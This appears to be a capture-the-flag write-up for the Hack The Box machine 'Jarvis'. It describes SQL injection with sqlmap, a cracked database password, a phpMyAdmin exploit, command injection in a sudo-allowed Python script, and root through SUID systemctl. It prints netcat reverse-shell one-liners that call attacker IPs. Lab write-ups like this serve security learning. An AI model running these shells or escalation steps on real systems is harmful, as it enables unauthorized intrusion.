+++
title = 'Jarvis'
description = 'Medium Linux'
writeup = true
hideMeta = true
+++

```bash
nmap 10.129.229.137 -p- -vv -T4 -Pn --min-rate=1000 -sC
```

![Jarvis (Medium).png](Jarvis%20%28Medium%29.png)

```
22 - SSH - OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80 - HTTP - Apache httpd 2.4.25 ((Debian))
64999 - HTTP - Apache httpd 2.4.25 ((Debian))
```

Port 80: hotel booking page.

![Jarvis (Medium)-1.png](Jarvis%20%28Medium%29-1.png)

Running PHP. `http://10.129.229.137/room.php?cod=5` - parameters on room.php switch rooms. Domain name `supersecurehotel.htb` in the corner.

![Jarvis (Medium)-2.png](Jarvis%20%28Medium%29-2.png)

The hell is this:

![Jarvis (Medium)-3.png](Jarvis%20%28Medium%29-3.png)

Added `supersecurehotel.htb` to `/etc/hosts`.

Fuzzed both ports. Found `/images` on port 80:

![Jarvis (Medium)-4.png](Jarvis%20%28Medium%29-4.png)

Not much can be done there though. Another directory: `phpmyadmin`.

![Jarvis (Medium)-5.png](Jarvis%20%28Medium%29-5.png)

Also able to access the javascript files.

![Jarvis (Medium)-6.png](Jarvis%20%28Medium%29-6.png)

phpMyAdmin 4.8.0 running:

![Jarvis (Medium)-7.png](Jarvis%20%28Medium%29-7.png)

All the 4.8.0 exploits I found require being logged in as a user - we don't have creds.

Stuck. Tried fuzzing subdomains - nothing there.

Took a sneak peek at the walkthrough - there's possibly some injection in the way rooms are found, which we'd seen before.

![Jarvis (Medium)-9.png](Jarvis%20%28Medium%29-9.png)

Some things stand out: `cod` is expecting an integer, because if we put a quote then...

![Jarvis (Medium)-10.png](Jarvis%20%28Medium%29-10.png)

sqlmap finds injection - if there's an option to use boolean blind, use that. `-r` for request method, `-u` for url method. Try other methods when they don't work.

![Jarvis (Medium)-11.png](Jarvis%20%28Medium%29-11.png)

![Jarvis (Medium)-12.png](Jarvis%20%28Medium%29-12.png)
![Jarvis (Medium)-13.png](Jarvis%20%28Medium%29-13.png)

User: DBadmin
Password hash: `*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0`
Password: `imissyou`

![Jarvis (Medium)-14.png](Jarvis%20%28Medium%29-14.png)

That allows login into phpMyAdmin.

![Jarvis (Medium)-15.png](Jarvis%20%28Medium%29-15.png)

Looking at previous exploits, this one looks like it'll work:

https://www.exploit-db.com/exploits/50457

It works!

![Jarvis (Medium)-16.png](Jarvis%20%28Medium%29-16.png)

```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
```

Reliable shell.

![Jarvis (Medium)-17.png](Jarvis%20%28Medium%29-17.png)

```bash
python3 exploit.py supersecurehotel.htb 80 /phpmyadmin DBadmin imissyou 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.196 9000 >/tmp/f'
```

![Jarvis (Medium)-18.png](Jarvis%20%28Medium%29-18.png)

After upgrading the shell, `sudo -l` shows www-data can run `simpler.py` as the user `pepper` without a password:

![Jarvis (Medium Linux)-1.png](Jarvis%20%28Medium%20Linux%29-1.png)

Able to read the python - looking through the code, `-l` runs the following function:

![Jarvis (Medium Linux)-2.png](Jarvis%20%28Medium%20Linux%29-2.png)

`os.system` is being run, which directly runs system commands. In the "forbidden" characters there's no `$`, which means we can write commands inside `$()` - they'll execute when the parameter is resolved before being passed into the ping command.

![Jarvis (Medium Linux)-3.png](Jarvis%20%28Medium%20Linux%29-3.png)

But there's no visible output when we run commands:

![Jarvis (Medium Linux)-4.png](Jarvis%20%28Medium%20Linux%29-4.png)

The shell substitution launches an interactive bash shell as pepper, but since this runs inside `os.system('ping' + command)`, the new shell inherits the stdin/stdout of the ping process - not a proper interactive TTY. So interactive commands like `whoami`, `id`, `ls` produce no visible output because their stdout/stderr aren't connected to the terminal.

So let's send back a reverse shell as pepper instead.

![Jarvis (Medium Linux)-5.png](Jarvis%20%28Medium%20Linux%29-5.png)
![Jarvis (Medium Linux)-6.png](Jarvis%20%28Medium%20Linux%29-6.png)

Looking in the binaries folder, there are binaries with the setuid bit set - the files can be run as the owner.

![Jarvis (Medium Linux)-9.png](Jarvis%20%28Medium%20Linux%29-9.png)

`systemctl` has SUID set, which is not normal, and pepper has execute privileges. Going to GTFO bins:

![Jarvis (Medium Linux)-10.png](Jarvis%20%28Medium%20Linux%29-10.png)

Create a shell script containing reverse shell code.

![Jarvis (Medium Linux)-7.png](Jarvis%20%28Medium%20Linux%29-7.png)

Then create a service as shown in the GTFO bins example, link the service and enable it - it runs shell.sh and we get a root shell.

![Jarvis (Medium Linux)-8.png](Jarvis%20%28Medium%20Linux%29-8.png)

Root shell:

![Jarvis (Medium Linux)-11.png](Jarvis%20%28Medium%20Linux%29-11.png)
